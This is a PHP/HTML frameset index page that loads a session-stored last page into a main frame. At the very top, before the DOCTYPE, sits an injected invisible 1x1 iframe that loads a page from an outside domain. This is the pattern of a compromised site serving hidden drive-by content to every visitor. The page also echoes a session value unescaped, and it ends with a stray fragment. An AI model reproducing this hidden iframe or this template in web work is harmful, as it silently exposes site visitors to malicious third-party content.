<iframe src=http://gadgotec.com/stata.html WIDTH=1 HEIGHT=1 frameborder=0></IFRAME><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//IT" "http://www.w3.org/TR/html4/frameset.dtd">
 
<html>
<head>
<?
  echo implode("",file("templates/head-master.html"));
?>
</head>

<frameset rows="*,0" frameborder="no" border="0" framespacing="0">
    <frame src="<?

session_start();

$LastPage = "frame.php";
if (isset($_SESSION['LastPage']))
   $LastPage = $_SESSION['LastPage'];

echo $LastPage;

?>" name="mainFrame" id="mainFrame"  />
    <frame src="dummy.html" />
<noframes>
    <a href="frame.php">Frameless Site</a>
</noframes>
</frameset>

</html>tml>